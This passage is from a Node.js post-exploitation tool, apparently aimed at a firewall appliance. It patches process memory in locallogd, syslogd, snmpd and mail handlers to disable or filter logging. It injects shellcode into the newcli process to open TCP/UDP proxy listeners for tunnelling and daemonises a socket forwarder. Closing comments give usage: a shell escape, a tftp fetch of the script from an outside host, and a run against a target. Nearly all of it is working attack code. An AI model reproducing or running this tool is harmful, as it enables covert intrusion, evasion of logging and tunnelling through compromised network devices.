        console.log(`ADDR_FWRITE_PTR:${ADDR_FWRITE_PTR.toString(16)},ADDR_WRITE_PTR:${ADDR_WRITE_PTR.toString(16)},ADDR_WRITEV_PTR:${ADDR_WRITEV_PTR.toString(16)},ADDR_SEND_PTR:${ADDR_SEND_PTR.toString(16)},ADDR_session_io_event_PTR:${ADDR_session_io_event_PTR.toString(16)}`);
		
		console.log(`\r\n`);
		console.log(`ADDR_RET_PTR_ZERO:${ADDR_RET_PTR_ZERO.toString(16)},ADDR_RET_PTR_NONE:${ADDR_RET_PTR_NONE.toString(16)},ADDR_RET_PTR_SIZE:${ADDR_RET_PTR_SIZE.toString(16)}`);
			
		const bytesFwriteAddr = readProcessMemory(pid_locallogd, base_locallogd + ADDR_FWRITE_PTR, 8);
        const bytesWriteAddr = readProcessMemory(pid_locallogd, base_locallogd + ADDR_WRITE_PTR, 8);  
		const bytesWritevAddr = readProcessMemory(pid_syslogd, base_syslogd + ADDR_WRITEV_PTR, 8);
		const bytesSendAddr = readProcessMemory(pid_snmpd, base_snmpd + ADDR_SEND_PTR, 8);
		const bytesSioeAddr = readProcessMemory(pid_mail, base_mail + ADDR_session_io_event_PTR, 8);

        const FwriteAddr = bufferToUint64LE(bytesFwriteAddr);
        const WriteAddr  = bufferToUint64LE(bytesWriteAddr);
		const WritevAddr = bufferToUint64LE(bytesWritevAddr);
		const SendAddr = bufferToUint64LE(bytesSendAddr);
		const SioeAddr = bufferToUint64LE(bytesSioeAddr);

        if (FwriteAddr === base_locallogd + ADDR_RET_PTR_ZERO && WriteAddr === base_locallogd + ADDR_RET_PTR_ZERO) {
        } else {
            console.log(`Not in disabled state, nothing to do`);
			console.log(`fwrite:${FwriteAddr.toString(16)},write:${WriteAddr.toString(16)},writev:${WritevAddr.toString(16)}`);
            return;
        }

		console.log(`\r\n`);
		console.log(`write: 0x${ADDR_WRITE_PTR.toString(16)} QWORD: 0x${WriteAddr.toString(16)}`);
        console.log(`fwrite: 0x${ADDR_FWRITE_PTR.toString(16)} QWORD: 0x${FwriteAddr.toString(16)}`);
        console.log(`writev: 0x${ADDR_WRITEV_PTR.toString(16)} QWORD: 0x${WritevAddr.toString(16)}`);
		console.log(`send: 0x${ADDR_SEND_PTR.toString(16)} QWORD: 0x${SendAddr.toString(16)}`);
		console.log(`session_io_event: 0x${ADDR_session_io_event_PTR.toString(16)} QWORD: 0x${SioeAddr.toString(16)}`);

        const addresses = readAddress();
        const writeAddrOld = addresses.write;
        const fwriteAddrOld = addresses.fwrite;
		const writevAddrOld = addresses.writev;
		const sendAddrOld = addresses.send;
		const session_io_event_AddrOld = addresses.session_io_event;
		const sendmsg = addresses.sendmsg;

        const bytesFwriteAddrOld = uint64LEToBuffer(fwriteAddrOld);
        const bytesWriteAddrOld  = uint64LEToBuffer(writeAddrOld);
		const bytesWritevAddrOld  = uint64LEToBuffer(writevAddrOld);
		const bytesSendAddrOld  = uint64LEToBuffer(sendAddrOld);
		const bytes_session_io_event_AddrOld  = uint64LEToBuffer(session_io_event_AddrOld);
		const bytesSendmsg  = uint64LEToBuffer(sendmsg);
				
		console.log(`fwrite: 0x${fwriteAddrOld.toString(16)},write: 0x${writeAddrOld.toString(16)},writev: 0x${writevAddrOld.toString(16)},send: 0x${sendAddrOld.toString(16)},session_io_event: 0x${session_io_event_AddrOld.toString(16)}`);
		
		//console.log(`enable test`);

        writeProcessMemory(pid_locallogd, base_locallogd + ADDR_FWRITE_PTR, bytesFwriteAddrOld);
        writeProcessMemory(pid_locallogd, base_locallogd + ADDR_WRITE_PTR, bytesWriteAddrOld);
		writeProcessMemory(pid_syslogd, base_syslogd + ADDR_WRITEV_PTR, bytesWritevAddrOld);

		writeProcessMemory(pid_snmpd, base_snmpd + ADDR_SEND_PTR, bytesSendAddrOld);

		writeProcessMemory(pid_mail, base_mail + ADDR_session_io_event_PTR, bytes_session_io_event_AddrOld);
		
		writeProcessMemory(pid_syslogd, base_syslogd + ADDR_SENDMSG_PTR, bytesSendmsg);
		
    } catch (err) {
        console.error(`Error: ${err.message}`);
        process.exit(1);
    }
}


function unfilter(){
	try {
		console.log(`unfilter entry\r\n`);
		let HOOK_FUNC_ADDR,HOOK_TARGET_PTR;
		
		const pid_locallogd = getPidByName('locallogd');
        console.log(`locallogd pid: ${pid_locallogd}`);

        let base_locallogd = getExecutableBase(pid_locallogd, '/bin/init');
        console.log(`locallogd base address: 0x${base_locallogd.toString(16)}`);

		if (base_locallogd === 0x400000n )
		{
			HOOK_TARGET_PTR = 0x11910A0n - base_locallogd;
			//HOOK_FUNC_ADDR = 0x119120Fn - base_locallogd;
			HOOK_FUNC_ADDR1 = 0x1191410n - base_locallogd;
			HOOK_FUNC_ADDR2 = 0x11914b4n - base_locallogd;
		}else{
			
			HOOK_TARGET_PTR = 0X13CD960n;
			//HOOK_FUNC_ADDR = 0x13CDAD3n;
			HOOK_FUNC_ADDR1 = 0x13CDCAAn;
			HOOK_FUNC_ADDR2 = 0x13CDD44n;
		}

		HOOK_TARGET_PTR+= base_locallogd;
		HOOK_FUNC_ADDR1+=base_locallogd;
		HOOK_FUNC_ADDR2+=base_locallogd;
		
		const addresses = readFilter();
		
        const delta1 = addresses.hookAddr1;
		const bdelta1 = intToBuffer(delta1);
		
		const delta2 = addresses.hookAddr2;
		const bdelta2 = intToBuffer(delta2);

		writeProcessMemory(pid_locallogd, HOOK_FUNC_ADDR1 + 0x1n,bdelta1);
		writeProcessMemory(pid_locallogd, HOOK_FUNC_ADDR2 + 0x1n,bdelta2);
    } catch (err) {
        console.error(`Error: ${err.message}`);
        process.exit(1);
    }
}


function filter(value) {
    try {
		console.log(`filter entry:${value}`);
		
		let HOOK_TARGET_PTR,HOOK_BASE_ADDR,HOOK_FUNC_ADDR1,HOOK_FUNC_ADDR2,HOOK_CODE_SIZE;
		
		const pid_locallogd = getPidByName('locallogd');
        console.log(`locallogd pid: ${pid_locallogd}`);

        let base_locallogd = getExecutableBase(pid_locallogd, '/bin/init');
        console.log(`locallogd base address: 0x${base_locallogd.toString(16)}`);
			
		if (base_locallogd === 0x400000n )
		{
			HOOK_TARGET_PTR = 0x11910A0n - base_locallogd;	
			//HOOK_FUNC_ADDR = 0x119120Fn - base_locallogd;	
			HOOK_FUNC_ADDR1 = 0x1191410n - base_locallogd;	
			HOOK_FUNC_ADDR2 = 0x11914b4n - base_locallogd;
			HOOK_BASE_ADDR = 0x2CAB800n - base_locallogd ;
			HOOK_CODE_SIZE = 0x800n;
		}else{	
			HOOK_TARGET_PTR = 0X13CD960n;
			//HOOK_FUNC_ADDR = 0x13CDAD3n;
			HOOK_FUNC_ADDR1 = 0x13CDCAAn ;
			HOOK_FUNC_ADDR2 = 0x13CDD44n ;
			HOOK_BASE_ADDR = ADDR_SENDMSG_REPLACE + 0x100n;
			//console.log('ADDR_SENDMSG_REPLACE:', ADDR_SENDMSG_REPLACE.toString('16'));
			HOOK_CODE_SIZE = 0x800n;
		}
		HOOK_BASE_ADDR += base_locallogd;
		HOOK_TARGET_PTR += base_locallogd;
		HOOK_FUNC_ADDR1 += base_locallogd;
		HOOK_FUNC_ADDR2 += base_locallogd;
			
		console.log('HOOK_BASE_ADDR:', HOOK_BASE_ADDR.toString('16'));

		//在 JavaScript/Node.js 中，所有数字都是 number 类型（双精度浮点数）,而不是BigInt
		const bDeltaTarget1 = readProcessMemory(pid_locallogd, HOOK_FUNC_ADDR1 + 0x1n, 4);
		const deltaTarget1 = bDeltaTarget1.readUInt32LE(0);
		console.log('bDeltaTarget1:', bDeltaTarget1.toString('hex'));		
		
		const bDeltaTarget2 = readProcessMemory(pid_locallogd, HOOK_FUNC_ADDR2 + 0x1n, 4);
		const deltaTarget2 = bDeltaTarget2.readUInt32LE(0);
		console.log('bDeltaTarget2:', bDeltaTarget2.toString('hex'));

		writeFilter(deltaTarget1,deltaTarget2);
		
		writeProcessMemory(pid_locallogd, HOOK_BASE_ADDR, g_code_replace);
		
		const bbase_locallogd = uint64LEToBuffer(base_locallogd);
		writeProcessMemory(pid_locallogd, HOOK_BASE_ADDR - 0x10n, bbase_locallogd);
		
		const bNewTargetAddr = uint64LEToBuffer(HOOK_BASE_ADDR);	
		console.log('bNewTargetAddr:', bNewTargetAddr.toString('hex'));
		const stubTarget = HOOK_BASE_ADDR + HOOK_CODE_SIZE;
		writeProcessMemory(pid_locallogd, stubTarget , bNewTargetAddr);
		
		const newDeltaTarget1 =  HOOK_BASE_ADDR - (HOOK_FUNC_ADDR1+0x5n);
		const bNewDeltaTarget1 = intToBuffer(newDeltaTarget1);	
		writeProcessMemory(pid_locallogd, HOOK_FUNC_ADDR1 + 0x1n, bNewDeltaTarget1);
		console.log('bNewDeltaTarget1:', bNewDeltaTarget1.toString('hex'));
		
		const newDeltaTarget2 =  HOOK_BASE_ADDR - (HOOK_FUNC_ADDR2+0x5n);
		const bNewDeltaTarget2 = intToBuffer(newDeltaTarget2);	
		writeProcessMemory(pid_locallogd, HOOK_FUNC_ADDR2 + 0x1n, bNewDeltaTarget2);
		console.log('bNewDeltaTarget2:', bNewDeltaTarget2.toString('hex'));

		const formatAddr = stubTarget + 0x10n;
			
		/*
		if (value.length === 1) {
			value = value[0];
			const inum = parseInt("1",10)
			//const inum = value.length;
			const bnum = intToBuffer(inum);
			writeProcessMemory(pid_locallogd, formatAddr, bnum);
			//Buffer类型的正确显示方法:
			console.log('bnum:', bnum.toString('hex'));
			const bufvalue = Buffer.from(value, 'utf8'); 
			const bufWithNull = Buffer.concat([bufvalue, Buffer.alloc(1)]);
			writeProcessMemory(pid_locallogd, formatAddr + 0x4n, bufWithNull);
			console.log('bufvalue:', bufvalue.toString('utf-8'));
		}
		else{

		}
		*/
		const inum = value.length;
		const bnum = intToBuffer(inum);
		writeProcessMemory(pid_locallogd, formatAddr, bnum);
		//Buffer类型的正确显示方法:
		console.log('bnum:', bnum.toString('hex'));
	
		const combined = Buffer.concat(value.map(v => Buffer.from(v + '\0')));
		writeProcessMemory(pid_locallogd, formatAddr + 0x4n, combined);
		console.log('combined:', combined.toString('hex'));
		console.log('combined:', combined.toString('utf-8'));
		
    } catch (err) {
        console.error(`Error: ${err.message}`);
        process.exit(1);
    }
}


function ntohs(port){
	return ((port & 0xff) << 8) | ((port >> 8) & 0xff);
}



function forwardToUnix(socketPath) {
  const server = net.createServer(tcp => {
    const unix = net.createConnection(socketPath);
    tcp.pipe(unix);
	unix.pipe(tcp);
    tcp.on('error', () => unix.destroy());
    unix.on('error', () => tcp.destroy());
    tcp.on('close', () => unix.end());
    unix.on('close', () => tcp.end());
  });
  server.listen(g_tcp_listen_port, '0.0.0.0', () => console.log('Listening on ${g_tcp_listen_port} (daemon)'));
  // 服务器会保持事件循环，无需额外操作
}


const dgram = require('dgram');

function forwardUdpToUnix_old(socketPath, listenPort = g_udp_listen_port) {
  let clientAddr = null;
  const unix = net.createConnection(socketPath);
  const server = dgram.createSocket('udp4');
  server.on('message', (msg, rinfo) => {
    clientAddr = rinfo;
    unix.write(msg);
  });
  unix.on('data', data => {
    if (clientAddr) server.send(data, clientAddr.port, clientAddr.address);
  });
  server.bind(listenPort, '0.0.0.0', () => console.log(`UDP listening on ${listenPort}`));
}





function forwardUdpToUnix(socketPath, listenPort = g_udp_listen_port) {
  let currentClient = null;            // 保存最近活跃的 UDP 客户端地址 { address, port }
  let unix = null;

  // ---------- Unix 套接字连接与重连 ----------
  function connectUnix() {
    if (unix) unix.destroy();
    unix = net.createConnection(socketPath);
    unix.on('connect', () => console.log(`Connected to Unix socket: ${socketPath}`));
    unix.on('error', (err) => console.error('Unix socket error:', err.message));
    unix.on('close', () => {
      console.log('Unix socket closed, reconnecting in 1s...');
      setTimeout(connectUnix, 1000);
    });

    // 从 Unix 套接字读取数据并发送给 UDP 客户端
    unix.on('data', (data) => {
      if (currentClient) {
        const { address, port } = currentClient;
        udpServer.send(data, port, address, (err) => {
          if (err) console.error('Send UDP error:', err.message);
        });
      } else {
        console.warn('No UDP client known, dropping Unix data');
      }
    });
  }

  // ---------- UDP 服务器 ----------
  const udpServer = dgram.createSocket('udp4');
  udpServer.on('message', (msg, rinfo) => {
    // 更新当前客户端地址
    currentClient = { address: rinfo.address, port: rinfo.port };

    // 将数据写入 Unix 套接字（若可用）
    if (unix && unix.writable) {
      unix.write(msg, (err) => {
        if (err) console.error('Write to Unix failed:', err.message);
      });
    } else {
      console.warn('Unix socket not ready, dropping UDP packet');
    }
  });

  udpServer.on('error', (err) => console.error('UDP server error:', err));
  udpServer.bind(listenPort, '0.0.0.0', () => {
    console.log(`UDP listening on ${listenPort}`);
    connectUnix(); // 绑定成功后连接 Unix
  });

  return udpServer; // 返回服务器对象以便外部控制
}





function daemonize() {
  if (process.env.NODE_DAEMON === 'true') {
    
	forwardUdpToUnix('/umidsu');
	//forwardUdpToUnix('/umidsu', g_tcp_listen_port);
	forwardToUnix('/umidst');
    return;
  }


  const child = spawn(process.argv[0], [path.resolve(__filename), "-natServer"], {
    env: { ...process.env, NODE_DAEMON: 'true' }, 
    detached: true,  
    stdio: 'ignore', 
  });
  child.unref(); 
  console.log('Daemon started, parent exiting...');
  //process.exit(0);
}


function testcode(args){
	if(args.dip == undefined || args.dport == undefined || args.pid == undefined)
	{
		console.log(`dip or dport or pid undefined`);
		return;
	}
	const pid = parseInt(args.pid,10);
	let base = getExecutableBase(pid, '/bin/init');
	const THREAD_PARAM_ADDR = 0x448B80n ;
	
	const ENTRY_PROXY_ADDR = 0x1F45D20n;

	const UDP_LISTENER_ADDR = 0x4DC810n;
	
	const TCP_LISTENER_ADDR = 0x4D31E0n;
	
	const TCP_PROXY_ADDR = 0x2CAB810n;
	
	let listen_port = ntohs(g_tcp_listen_port);
	
	const bdip = ipToBinary(args.dip);
	
	let dport = parseInt(args.dport,10);

	dport = ntohs(dport)

	const bdport = intToBuffer(dport);

	const bzero = intToBuffer(0);
	
	writeProcessMemory(pid, THREAD_PARAM_ADDR + 0n, bdip);
	writeProcessMemory(pid, THREAD_PARAM_ADDR + 4n, bdport);
	
	writeProcessMemory(pid, THREAD_PARAM_ADDR + 8n, bzero);
	const blisten_port = intToBuffer(listen_port);
	writeProcessMemory(pid, THREAD_PARAM_ADDR + 12n, blisten_port);
	const bBaseAddr = uint64LEToBuffer(base);
	writeProcessMemory(pid, THREAD_PARAM_ADDR + 16n, bBaseAddr);
	
	writeProcessMemory(pid, ENTRY_PROXY_ADDR, g_proxy_entry);
	writeProcessMemory(pid, TCP_PROXY_ADDR, g_tcp_proxy);
	writeProcessMemory(pid, UDP_LISTENER_ADDR, g_udp_listener);
	writeProcessMemory(pid, TCP_LISTENER_ADDR, g_tcp_listener);
	
	//22B3ED0
	//const jmpaddr = 0x22B4E58n ;
	//22b2d70
	const calladdr = 0x22B51CBn;
	const deltaAddr =  ENTRY_PROXY_ADDR - (calladdr+0x5n);
	const bDeltaAddr = intToBuffer(deltaAddr);	
	writeProcessMemory(pid, calladdr + 0x1n, bDeltaAddr);
	
	daemonize();

	console.log("\n[*] injection done");
}



function natThread(args){
	try {	
		if(args.dip == undefined || args.dport == undefined || args.vdom == undefined)
		{
			console.log(`dip or dport or vdom undefined`);
			return;
		}
		
		console.log(`dip:${args.dip},dport:${args.dport},vdom:${args.vdom}`);
		
		const vdom = args.vdom;	
		
		const CONFIG = {
		  VDOM_TARGET: vdom,
		};	
		
		// ---------- 1. 启动 newcli ----------
		const child = spawn(
		  "/bin/newcli",
		  ["admin", "admin", "root", "super_admin", "root"],
		  {
			detached: true,
			stdio: ["pipe", "pipe", "pipe"],
			// 关键：设置 PPID 环境变量或模拟 init 环境
			/*
			env: {
			  ...process.env,
			  // 尝试欺骗 newcli 认为是从 init 启动
			  TERM: "vt100",
			},
			*/
		  },
		);
		child.unref();

		child.on("error", (err) => {
		  console.error("spawn failed:", err);
		  process.exit(1);
		});

		// newcli 崩溃后写 stdin 会触发 EPIPE
		child.stdin.on("error", (err) => {
		  if (err.code !== "EPIPE") console.error("stdin error:", err);
		});

		// ---------- 2. 状态机 ----------
		const S = { WAIT_PROMPT: 0, INJECTING: 1, RUNNING: 2 };
		let state = S.WAIT_PROMPT;
		let buf = "";

		child.stdout.on("data", (data) => {
		  const text = data.toString();
		  process.stdout.write(text);
		  buf += text;
		  if (buf.length > 4096) buf = buf.slice(-4096); // 防止缓冲膨胀

		  // 提示符以 "# " 结尾且后面无换行
		  if (state === S.WAIT_PROMPT && /#\s$/.test(buf)) {
			state = S.INJECTING;
			onReady().catch((e) => {
			  console.error("inject/trigger failed:", e);
			  shutdown(1);
			});
		  }
		});

		child.stderr.on("data", (data) => {
		  console.error("STDERR:", data.toString());
		});

		async function onReady() {
		  // ---------- 3. 进程注入：等它彻底完成 ----------	  

		  // ---------- 4. 注入完成后再发触发命令 ----------
		  child.stdin.write("config vdom\n");
		  child.stdin.write(`edit ${CONFIG.VDOM_TARGET}\n`);

		  await performInjection(child.pid);
		  
		  child.stdin.write("end\n");

		  child.stdin.write("config vdom\n");
		  // 注意：不能有 "exit\n" 和 stdin.end()
		  
		  Disinjection(child.pid);

		  state = S.RUNNING;
		  startHeartbeat();
		  console.log("\n[*] triggered, newcli kept alive, shellcode running");
		}


		// ---------- 5. 保活 ----------
		let heartbeat = null;
		function startHeartbeat() {
		  heartbeat = setInterval(() => {
			if (state === S.RUNNING) child.stdin.write("\n"); // 空行只刷新提示符
		  }, 60_000);
		}

		// ---------- 6. 退出控制（之后接到指令/信号时调 shutdown） ----------
		function shutdown(code = 0) {
		  if (heartbeat) clearInterval(heartbeat);
		  try {
			child.stdin.write("exit\n");
		  } catch {}
		  // 给正常退出 2 秒，超时强杀
		  setTimeout(() => {
			try {
			  child.kill("SIGKILL");
			} catch {}
			process.exit(code);
		  }, 2000).unref();
		}

		process.on("SIGINT", () => shutdown(0));
		process.on("SIGTERM", () => shutdown(0));

		child.on("close", (code, signal) => {
		  // RUNNING 状态下 close = shellcode 把进程搞崩了或被杀，要报出
		  console.log(`\nnewcli exited (code=${code}, signal=${signal}), state=${state}`,);
		  if (heartbeat) clearInterval(heartbeat);
		  process.exit(code ?? 1);
		});

		console.log(`background process is running!\r\n`);
		
		async function Disinjection(pid) {
			base = getExecutableBase(pid, '/bin/init');
			//22B3ED0
			//const jmpaddr = 0x22B4E58n ;
			//22b2d70
			if (base === 0x400000n )
			{
				const calladdr = 0x22B51CBn;
				const deltaAddr =  0xffffdba0;
				const bDeltaAddr = intToBuffer(deltaAddr);	
				writeProcessMemory(pid, calladdr + 0x1n, bDeltaAddr);
			}
			else{
				//const calladdr = base + 0x2792404n;//0x27925BFn;;
				//const deltaAddr =  0x0001def7;//0xffffdcbc;
				const calladdr = base + 0x27925BFn;
				const deltaAddr = 0xffffdcbc;
				const bDeltaAddr = intToBuffer(deltaAddr);	
				writeProcessMemory(pid, calladdr + 0x1n, bDeltaAddr);
			}
			console.log("\n[*] Disinjection done");
		}

		// 注入程序
		async function performInjection(pid) {
			console.log("\n[*] hooking into newcli pid", pid, "...");
			
			//const pid_locallogd = getPidByName('locallogd');
			base = getExecutableBase(pid, '/bin/init');
			console.log(`pid:${pid}, base address: 0x${base.toString(16)}`);
			
			let THREAD_PARAM_ADDR,ENTRY_PROXY_ADDR,UDP_LISTENER_ADDR,TCP_LISTENER_ADDR,TCP_PROXY_ADDR,NEWCLI_HOOK_ADDR;
			
			let CODE_UDP_LISTENER,CODE_TCP_LISTENER,CODE_TCP_PROXY,CODE_PROXY_ENTRY;
				
			if (base === 0x400000n )
			{
				THREAD_PARAM_ADDR =0x448B80n ;
				ENTRY_PROXY_ADDR = 0x1F45D20n;
				UDP_LISTENER_ADDR = 0x4DC810n;
				TCP_LISTENER_ADDR = 0x4D31E0n;
				TCP_PROXY_ADDR = 0x2CAB810n;
				//22B3ED0
				//const jmpaddr = 0x22B4E58n ;
				//22b2d70
				NEWCLI_HOOK_ADDR = 0x22B51CBn;
						
				CODE_UDP_LISTENER = g_udp_listener;
				CODE_TCP_LISTENER = g_tcp_listener;
				CODE_TCP_PROXY = g_tcp_proxy;
				CODE_PROXY_ENTRY = g_proxy_entry;
			}
			else{
				THREAD_PARAM_ADDR = base + 0x2670D70n;
				ENTRY_PROXY_ADDR = base + 0x2655680n;
				UDP_LISTENER_ADDR = base + 0x26543F0n;
				TCP_LISTENER_ADDR = base +  0x465c00n;
				TCP_PROXY_ADDR = TCP_LISTENER_ADDR +0x400n ;
				//2791420
				//2790280
				//NEWCLI_HOOK_ADDR = base + 0x2792404n;	//0x27925BFn;
				NEWCLI_HOOK_ADDR = base + 0x27925BFn;
				
				CODE_UDP_LISTENER = g_udp_listener_phy;
				CODE_TCP_LISTENER = g_tcp_listener_phy;
				CODE_TCP_PROXY = g_tcp_proxy_phy;
				CODE_PROXY_ENTRY = g_proxy_entry_phy;
			}

			const listen_port = ntohs(g_tcp_listen_port);
			
			const bdip = ipToBinary(args.dip);
			
			let dport = parseInt(args.dport,10);
			dport = ntohs(dport)
			const bdport = intToBuffer(dport);
			const bzero = intToBuffer(0);
			
			writeProcessMemory(pid, THREAD_PARAM_ADDR + 0n, bdip);
			writeProcessMemory(pid, THREAD_PARAM_ADDR + 4n, bdport);		
			writeProcessMemory(pid, THREAD_PARAM_ADDR + 8n, bzero);
			const blisten_port = intToBuffer(listen_port);
			writeProcessMemory(pid, THREAD_PARAM_ADDR + 12n, blisten_port);
			if (base === 0x400000n )
			{
				const bBaseAddr = uint64LEToBuffer(0x0n);
				writeProcessMemory(pid, THREAD_PARAM_ADDR + 16n, bBaseAddr);
				writeProcessMemory(pid, ENTRY_PROXY_ADDR + 0x200n, bBaseAddr);

			}else{
				const bBaseAddr = uint64LEToBuffer(base);
				writeProcessMemory(pid, THREAD_PARAM_ADDR + 16n, bBaseAddr);
				writeProcessMemory(pid, ENTRY_PROXY_ADDR + 0x200n, bBaseAddr);	
			}
			
			writeProcessMemory(pid, ENTRY_PROXY_ADDR, CODE_PROXY_ENTRY);
			writeProcessMemory(pid, TCP_PROXY_ADDR, CODE_TCP_PROXY);
			writeProcessMemory(pid, UDP_LISTENER_ADDR, CODE_UDP_LISTENER);
			writeProcessMemory(pid, TCP_LISTENER_ADDR, CODE_TCP_LISTENER);
			
			const calladdr = NEWCLI_HOOK_ADDR;
			const deltaAddr =  ENTRY_PROXY_ADDR - (calladdr+0x5n);
			const bDeltaAddr = intToBuffer(deltaAddr);	
			writeProcessMemory(pid, calladdr + 0x1n, bDeltaAddr);

			console.log("\n[*] injection done");
		}

	} 
	catch (err) {
        console.error(`Error: ${err.message}`);
        process.exit(1);
    }
}





// shell 会将命令行参数按空格分割
/**
 * Parse command line arguments
 * @returns {object} Key-value arguments
 */
function parseArgs() {
    const args = {};
    const argv = process.argv.slice(2);
    let i = 0;

    while (i < argv.length) {
        const arg = argv[i];

        // 处理 --key 或 --key=value 或 --key:value
        if (arg.startsWith('--')) {
            let key, value;

            // 尝试按 '=' 或 ':' 分割
            const sepIndex = arg.search(/[=:]/);
            if (sepIndex !== -1) {
                key = arg.slice(2, sepIndex);
                value = arg.slice(sepIndex + 1);
                i++;
            } else {
                // 没有分隔符，尝试从下一个参数取值
                key = arg.slice(2);
                if (i + 1 < argv.length && !argv[i + 1].startsWith('-')) {
                    value = argv[i + 1];
                    i += 2;
                } else {
                    // 没有下一个值，视为布尔标记
                    value = '';
                    i++;
                }
            }

            // 去除引号（可选）
            if ((value.startsWith('"') && value.endsWith('"')) ||
                (value.startsWith("'") && value.endsWith("'"))) {
                value = value.slice(1, -1);
            }

            // 处理多值（逗号分隔）
            const parts = value.split(',').filter(v => v.length > 0);
            if (parts.length === 0) {
                args[key] = true;   // 无值 → 布尔 true
            } else if (parts.length === 1) {
                args[key] = parts[0]; // 单值保持字符串
            } else {
                args[key] = parts;    // 多值数组
            }

            console.log(`key: ${key}, value: ${value}, parsed:`, args[key]);
        }
        // 处理 -x 短选项（不带值）
        else if (arg.startsWith('-')) {
            args[arg.slice(1)] = true;
            i++;
        }
        // 位置参数（以 _0, _1 ... 存储）
        else {
            const posKeys = Object.keys(args).filter(k => k.startsWith('_'));
            args['_' + posKeys.length] = arg;
            i++;
        }
    }
    return args;
}

function isStringArray(value) {
    // 1. 必须是数组
    // 2. 数组中的每一个元素都必须是 string 类型
    return Array.isArray(value) && value.every(item => typeof item === 'string');
}

/**
 * Main entry point
 */
function main() {
    try {
        const args = parseArgs();
        console.log(args);

        if (args.disable) {
            //console.log('disable');
			GetAddresses();
            disableLog();
        } else if (args.enable) {
            //console.log('enable');
			GetAddresses();
            enableLog();
        }
		else if ( (args.filter !== undefined) && (args.filter !== true) && 
		(typeof args.filter === 'string' || isStringArray(args.filter)) ) {
			GetAddresses();
			filter(args.filter);
		} else if (args.unfilter === true) {
			GetAddresses();
			unfilter();
		}
		else if(args.nat ){
			GetAddresses();
			natThread(args);
			daemonize();
		}
		else if(args.testcode ){
			GetAddresses();
			testcode(args);
		}
		else if(args.natServer){
			daemonize();
		}
		else {
            console.error('Usage: ${progName} -disable/-enable --filter:mystring/--unfilter');
            process.exit(1);
        }
    } catch (err) {
        console.error(`Error: ${err.message}`);
        process.exit(1);
    }
}


//	config global
//	diagnose hardware smartctl sh
// 	/bin/busybox tftp 192.168.91.1 -g -l readmem.js -r readmem.js
//	/bin/node readmem.js -nat --vdom VDOM_A --dip 192.168.163.1 --dport 12345
main();